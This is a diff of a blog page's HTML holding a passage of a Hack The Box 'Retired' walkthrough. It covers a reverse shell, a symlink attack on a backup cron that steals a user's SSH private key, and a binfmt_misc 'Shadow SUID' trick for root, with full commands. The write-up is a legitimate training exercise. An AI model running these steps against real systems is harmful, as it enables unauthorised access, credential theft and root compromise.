-<p>ROP is the modern standard for exploiting binaries with NX. Instead of writing new code, you <strong>reuse the target's own code</strong>. Every library contains thousands of gadgets. The key insight is: you don't need to write new instructions — you just need to chain existing ones in the right order. The <code>jmp rsp</code> gadget is the bridge between the ROP chain (which makes the stack executable) and the shellcode (which gives us the shell).</p>
-<hr />
+
+<p>ROP is the modern standard for exploiting binaries with NX. Instead of writing new code, you <strong>reuse the target's own code</strong>. Every library contains thousands of gadgets. The key insight is: you don't need to write new instructions - you just need to chain existing ones in the right order. The <code>jmp rsp</code> gadget is the bridge between the ROP chain (which makes the stack executable) and the shellcode (which gives us the shell).</p>
+<hr>
 <h2 id="shell-as-www-data">Shell as www-data</h2>
 <h3 id="steps">Steps</h3>
 <ol>
 <li>Start listener: <code>nc -lnvp 4444</code></li>
 <li>Run: <code>python3 exploit.py</code></li>
 </ol>
-<h3 id="result">Result</h3>
+
 <pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.227.96] 46780
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre>
-<p>We have a shell as <code>www-data</code> — the web server user. Not root, but we're inside the machine now.</p>
+<p>We have a shell as <code>www-data</code> - the web server user. Not root, but we're inside the machine now.</p>
 <h3 id="upgrading-the-shell">Upgrading the shell</h3>
-<p>The initial shell is raw — no job control, no tab completion, awkward. We upgrade it:</p>
+<p>The initial shell is raw - no job control, no tab completion, awkward. We upgrade it:</p>
 <pre><code class="language-bash" data-language="bash">python3 -c 'import pty;pty.spawn("/bin/bash")'
 # Ctrl+Z
 stty raw -echo; fg
 export TERM=xterm
 </code></pre>
 <p>This gives us a proper interactive shell.</p>
-<h3 id="hacker-mindset-7">Hacker mindset</h3>
+
 <p>The initial shell from a buffer overflow is raw and fragile. Always upgrade immediately. A TTY shell lets you use <code>sudo</code>, passwords with prompts, vim, etc. The <code>stty raw -echo; fg</code> trick passes raw keystrokes to the remote shell instead of being processed by your local terminal.</p>
-<hr />
-<h2 id="privilege-escalation-www-data-to-dev">Privilege Escalation — www-data to dev</h2>
+<hr>
+<h2 id="privilege-escalation-www-data-to-dev">Privilege Escalation: www-data to dev</h2>
 <h3 id="discovering-the-backup-cron">Discovering the backup cron</h3>
 <pre><code class="language-bash" data-language="bash">ls -la /var/www/
 # Shows: 2026-06-09_10-26-00-html.zip, 2026-06-09_10-27-00-html.zip ...
@@ -342,7 +341,7 @@ SRC=/var/www/html
 DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
 /usr/bin/zip --recurse-paths "$DST" "$SRC"
 </code></pre>
-<p>It zips the entire <code>/var/www/html</code> directory. By default, <code>zip --recurse-paths</code> <strong>follows symlinks</strong> — it includes the contents of whatever the symlink points to, not the symlink itself.</p>
+<p>It zips the entire <code>/var/www/html</code> directory. By default, <code>zip --recurse-paths</code> <strong>follows symlinks</strong> - it includes the contents of whatever the symlink points to, not the symlink itself.</p>
 <h3 id="the-symlink-attack">The symlink attack</h3>
 <pre><code class="language-bash" data-language="bash">ln -s /home/dev/.ssh/id_rsa /var/www/html/id_rsa
 </code></pre>
@@ -354,21 +353,21 @@ cp $(ls /var/www/*.zip | tail -1) .
 unzip -p *.zip 'var/www/html/id_rsa'
 </code></pre>
 <p>The key is printed to stdout. We copy it to our Kali machine.</p>
-<h3 id="why-this-works">Why this works</h3>
+
 <p>The backup script runs as <code>dev</code>. Dev has read access to their own <code>.ssh/id_rsa</code>. By planting a symlink in a directory the script processes, we trick the script (running with dev's permissions) into including a file we can't directly read as www-data.</p>
-<p>This is called a <strong>symlink attack</strong> or <strong>symlink following vulnerability</strong>. The script doesn't validate whether the files being zipped are symlinks — it just follows them.</p>
-<h3 id="hacker-mindset-8">Hacker mindset</h3>
-<p>When you see a scheduled task (cron job) running as a privileged user that processes files in a directory you can write to, think symlinks. The cron has higher privileges than you — make it do your dirty work. This pattern appears constantly in CTFs and real-world privilege escalation: find a privileged process that touches files you control.</p>
-<hr />
-<h2 id="ssh-as-dev-user-flag">SSH as dev — User Flag</h2>
+<p>This is called a <strong>symlink attack</strong> or <strong>symlink following vulnerability</strong>. The script doesn't validate whether the files being zipped are symlinks - it just follows them.</p>
+
+<p>When you see a scheduled task (cron job) running as a privileged user that processes files in a directory you can write to, think symlinks. The cron has higher privileges than you - make it do your dirty work. This pattern appears constantly in CTFs and real-world privilege escalation: find a privileged process that touches files you control.</p>
+<hr>
+<h2 id="ssh-as-dev-user-flag">SSH as dev: User Flag</h2>
 <pre><code class="language-bash" data-language="bash">chmod 600 dev_id_rsa
 ssh -i dev_id_rsa dev@10.129.227.96
 cat user.txt
 # ebc767[redacted]1ac9da706
 </code></pre>
-<p>We now have a stable SSH shell as dev. SSH is much better than a reverse shell — it's persistent, supports file transfer (<code>scp</code>), and gives a proper terminal.</p>
-<hr />
-<h2 id="privilege-escalation-dev-to-root">Privilege Escalation — dev to root</h2>
+<p>We now have a stable SSH shell as dev. SSH is much better than a reverse shell - it's persistent, supports file transfer (<code>scp</code>), and gives a proper terminal.</p>
+<hr>
+<h2 id="privilege-escalation-dev-to-root">Privilege Escalation: dev to root</h2>
 <h3 id="enumeration-as-dev">Enumeration as dev</h3>
 <pre><code class="language-bash" data-language="bash">ls ~/
 # activate_license  emuemu  user.txt
@@ -398,13 +397,13 @@ int main(void) {
 <p>The registration format is:</p>
 <pre><code>:name:type:offset:magic:mask:interpreter:flags
 </code></pre>
-<p>The <strong><code>C</code> flag</strong> is crucial: it makes the interpreter run with the <strong>credentials of the file being executed</strong> — not the user who ran it. So if a SetUID (SUID) root binary is executed and matches a binfmt_misc rule with the C flag, the interpreter runs <strong>as root</strong>.</p>
+<p>The <strong><code>C</code> flag</strong> is crucial: it makes the interpreter run with the <strong>credentials of the file being executed</strong> - not the user who ran it. So if a SetUID (SUID) root binary is executed and matches a binfmt_misc rule with the C flag, the interpreter runs <strong>as root</strong>.</p>
 <h3 id="the-exploit-plan">The exploit plan</h3>
 <ol>
-<li><strong>Compile a rootshell</strong> — a binary that calls <code>setresuid(0,0,0)</code> and then launches bash</li>
+<li><strong>Compile a rootshell</strong> : a binary that calls <code>setresuid(0,0,0)</code> and then launches bash</li>
 <li><strong>Create a symlink</strong> with a custom extension pointing to a SUID binary (newgrp)</li>
 <li><strong>Register an extension rule</strong> via reg_helper that maps our extension to rootshell with the C flag</li>
-<li><strong>Run the symlink</strong> — binfmt_misc matches the extension, runs rootshell with root credentials</li>
+<li><strong>Run the symlink</strong> : binfmt_misc matches the extension, runs rootshell with root credentials</li>
 </ol>
 <h3 id="step-by-step">Step by step</h3>
 <p><strong>Step 1: Compile rootshell</strong></p>
@@ -426,19 +425,19 @@ chmod +x /dev/shm/rootshell
 <p><strong>Step 2: Symlink to SUID binary</strong></p>
 <pre><code class="language-bash" data-language="bash">ln -s /usr/bin/newgrp /dev/shm/newgrp.sploit
 </code></pre>
-<p><code>newgrp</code> is a SUID root binary (it changes group memberships and needs root to do so). By creating a symlink with the <code>.sploit</code> extension, when we run the symlink, the kernel sees a file named <code>newgrp.sploit</code> — our custom extension.</p>
+<p><code>newgrp</code> is a SUID root binary (it changes group memberships and needs root to do so). By creating a symlink with the <code>.sploit</code> extension, when we run the symlink, the kernel sees a file named <code>newgrp.sploit</code> - our custom extension.</p>
 <p><strong>Step 3: Register the binfmt_misc rule</strong></p>
 <pre><code class="language-bash" data-language="bash">echo ':sploit:E::sploit::/dev/shm/rootshell:C' | /usr/lib/emuemu/reg_helper
 </code></pre>
 <p>Breaking down <code>:sploit:E::sploit::/dev/shm/rootshell:C</code>:</p>
 <ul>
-<li><code>:sploit</code> — rule name: "sploit"</li>
-<li><code>:E</code> — match by <strong>Extension</strong> (not magic bytes)</li>
-<li><code>::</code> — no offset (not applicable for extension matching)</li>
-<li><code>:sploit</code> — match files with <code>.sploit</code> extension</li>
-<li><code>:</code> — no mask</li>
-<li><code>:/dev/shm/rootshell</code> — interpreter to run</li>
-<li><code>:C</code> — use <strong>Credentials</strong> of the matched file (newgrp is SUID root → run as root)</li>
+<li><code>:sploit</code> : rule name: "sploit"</li>
+<li><code>:E</code> : match by <strong>Extension</strong> (not magic bytes)</li>
+<li><code>::</code> : no offset (not applicable for extension matching)</li>
+<li><code>:sploit</code> : match files with <code>.sploit</code> extension</li>
+<li><code>:</code> : no mask</li>
+<li><code>:/dev/shm/rootshell</code> : interpreter to run</li>
+<li><code>:C</code> : use <strong>Credentials</strong> of the matched file (newgrp is SUID root → run as root)</li>
 </ul>
 <p><strong>Step 4: Trigger the exploit</strong></p>
 <pre><code class="language-bash" data-language="bash">/dev/shm/newgrp.sploit
@@ -450,15 +449,15 @@ chmod +x /dev/shm/rootshell
 <li>binfmt_misc finds our rule matching <code>.sploit</code></li>
 <li>The kernel sees <code>newgrp.sploit</code> is a symlink to <code>newgrp</code>, which has the <strong>SUID root bit</strong> set</li>
 <li>With the <code>C</code> flag, the kernel runs <code>/dev/shm/rootshell</code> with <strong>root credentials</strong></li>
-<li>rootshell calls <code>setresuid(0,0,0)</code> — succeeds (we're already root)</li>
+<li>rootshell calls <code>setresuid(0,0,0)</code> : succeeds (we're already root)</li>
 <li>rootshell calls <code>execve("/bin/bash", ["/bin/bash", "-p", NULL], NULL)</code></li>
 <li>bash starts with root privileges</li>
 </ol>
-<h3 id="hacker-mindset-9">Hacker mindset</h3>
-<p>This is a "Shadow SUID" attack. Instead of needing a SUID binary that does what you want, you <strong>hijack</strong> the execution of ANY existing SUID binary and redirect it to your own code — while keeping the SUID credentials.</p>
+
+<p>This is a "Shadow SUID" attack. Instead of needing a SUID binary that does what you want, you <strong>hijack</strong> the execution of ANY existing SUID binary and redirect it to your own code - while keeping the SUID credentials.</p>
 <p>The <code>C</code> flag in binfmt_misc exists for legitimate reasons (to support things like <code>.NET</code> executables that should run with the binary's permissions). But when combined with <code>cap_dac_override</code> on a binary that writes to the register file, it becomes a privilege escalation primitive.</p>
 <p>The key insight: <strong>reg_helper can write to a root-only file because of its capability. That write lets us register a rule that steals root credentials from SUID binaries.</strong></p>
-<hr />
+<hr>
 <h2 id="root-flag">Root Flag</h2>
 <pre><code class="language-bash" data-language="bash">root@retired:/home/dev# id
 uid=0(root) gid=0(root) groups=0(root)
@@ -466,7 +465,7 @@ uid=0(root) gid=0(root) groups=0(root)
 root@retired:/home/dev# cat /root/root.txt
 a8b4180[redacted]c379eb311
 </code></pre>
-<hr />
+<hr>
 <h2 id="lessons-learned">Lessons Learned</h2>
 <h3 id="1-file-read-just-etc-passwd">1. File Read ≠ Just /etc/passwd</h3>
 <p>An arbitrary file read is an extremely powerful primitive. On this box it gave us:</p>
@@ -477,8 +476,8 @@ a8b4180[redacted]c379eb311
 <li>Foundation for the entire exploit chain</li>
 </ul>
 <p>Always think: <strong>what files on this system are valuable?</strong></p>
-<h3 id="2-proc-is-a-treasure-map">2. /proc is a treasure map</h3>
-<p><code>/proc/[pid]/maps</code>, <code>/proc/[pid]/cmdline</code>, <code>/proc/sched_debug</code>, <code>/proc/sys/...</code> — the proc filesystem exposes the live kernel state. When you can read arbitrary files, <code>/proc</code> should be one of the first things you explore.</p>
+<h3 id="2-proc-is-a-privilege-map">2. /proc is a privilege map</h3>
+<p><code>/proc/[pid]/maps</code>, <code>/proc/[pid]/cmdline</code>, <code>/proc/sched_debug</code>, <code>/proc/sys/...</code> - the proc filesystem exposes the live kernel state. When you can read arbitrary files, <code>/proc</code> should be one of the first things you explore.</p>
 <h3 id="3-aslr-isn-t-magic">3. ASLR isn't magic</h3>
 <p>ASLR prevents hardcoded addresses. It does NOT prevent information leaks. If you can read the maps file of a process, ASLR is defeated for that process. Always look for memory leaks alongside buffer overflows.</p>
 <h3 id="4-forking-servers-are-special">4. Forking servers are special</h3>
@@ -488,12 +487,12 @@ a8b4180[redacted]c379eb311
 <h3 id="6-linux-capabilities-are-often-overlooked">6. Linux capabilities are often overlooked</h3>
 <p><code>setcap</code> gives fine-grained privileges to binaries without making them fully SUID root. But capabilities can be just as dangerous. <code>cap_dac_override</code> (bypasses file permissions) is nearly as powerful as root for file operations. Always run <code>getcap -r / 2&gt;/dev/null</code> as part of privilege escalation enumeration.</p>
 <h3 id="7-binfmt-misc-c-flag-suid-root">7. binfmt_misc C flag + SUID = root</h3>
-<p>The Shadow SUID technique: register a binfmt_misc rule with the C flag that matches any SUID binary. The interpreter inherits the SUID credentials. This works whenever you can write to <code>/proc/sys/fs/binfmt_misc/register</code> — normally only root can, but capabilities can grant this.</p>
+<p>The Shadow SUID technique: register a binfmt_misc rule with the C flag that matches any SUID binary. The interpreter inherits the SUID credentials. This works whenever you can write to <code>/proc/sys/fs/binfmt_misc/register</code> - normally only root can, but capabilities can grant this.</p>
 <h3 id="8-don-t-use-generic-elf-magic-bytes-for-binfmt-misc">8. Don't use generic ELF magic bytes for binfmt_misc</h3>
-<p><strong>Lesson learned the hard way on this box:</strong> If you register a binfmt_misc rule that matches generic ELF magic bytes (the first 24 bytes of any ELF binary), it will match <strong>everything</strong> — including the interpreter you registered. This causes infinite recursion in the kernel and breaks execution of ALL ELF binaries on the system. Always use the <strong>extension method</strong> (<code>:E:</code>) or very specific magic bytes unique to your target binary.</p>
+<p><strong>Lesson learned the hard way on this box:</strong> If you register a binfmt_misc rule that matches generic ELF magic bytes (the first 24 bytes of any ELF binary), it will match <strong>everything</strong> - including the interpreter you registered. This causes infinite recursion in the kernel and breaks execution of ALL ELF binaries on the system. Always use the <strong>extension method</strong> (<code>:E:</code>) or very specific magic bytes unique to your target binary.</p>
 <h3 id="9-when-things-break-pivot-with-what-still-works">9. When things break, pivot with what still works</h3>
-<p>When all ELF execution broke due to our faulty binfmt_misc rule, we found that <code>gcc</code> and <code>python3</code> are compiled as <code>ET_EXEC</code> (non-PIE) on this box and therefore didn't match our PIE-only (<code>ET_DYN</code>) binfmt_misc rule. This let us use Python3 to write files and use gcc to compile, which eventually let us fix the situation. <strong>Always check what tools still work</strong> and adapt.</p>
-<hr />
+<p>When the faulty binfmt_misc rule broke ELF execution, <code>gcc</code> and <code>python3</code> still worked because they are compiled as <code>ET_EXEC</code> (non-PIE) and did not match the PIE-only (<code>ET_DYN</code>) rule. Python 3 could still write files and gcc could still compile, providing a recovery path.</p>
+<hr>
 <h2 id="full-command-reference">Full Command Reference</h2>
 <pre><code class="language-bash" data-language="bash"># Recon
 nmap -p- --min-rate 10000 10.129.227.96
@@ -549,10 +548,9 @@ echo ':sploit:E::sploit::/dev/shm/rootshell:C' | /usr/lib/emuemu/reg_helper
 # Flags
 cat ~/user.txt
 cat /root/root.txt
-</code></pre>
-13:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$18"}}]
+</code></pre>13:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$18"}}]
 14:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-redcross-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: RedCross Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-routerspace-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: RouterSpace Walkthrough"}]]}]}]]}]
 15:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-19:T51f,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-retired-walkthrough/#article","headline":"Hack The Box: Retired Walkthrough","description":"An archived walkthrough of the retired Hack The Box Retired machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-retired-walkthrough/","datePublished":"2026-06-11T11:46:58.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3550,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/cd3259d63fc166894b18ff580f683cc1bb6516fc/HTB-Retired.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-retired-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-retired-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Retired Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-retired-walkthrough/"}]}]}16:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$19"}}]
+19:T58d,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-retired-walkthrough/#article","headline":"Hack The Box: Retired Walkthrough","description":"Execute-after-redirect file reads leaked the license service binary and live memory map for a ROP foothold, a backup symlink exposed dev's SSH key, and a capable helper registered a binfmt_misc rule that inherited root from a setuid binary.","url":"https://cyberkareem.com/writing/hackthebox-retired-walkthrough/","datePublished":"2026-06-11T11:46:58.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3494,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/cd3259d63fc166894b18ff580f683cc1bb6516fc/HTB-Retired.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-retired-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-retired-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Retired Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-retired-walkthrough/"}]}]}16:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$19"}}]
 17:["$","$L1a",null,{"children":["$","$1b",null,{"name":"Next.MetadataOutlet","children":"$@1c"}]}]
 1c:null
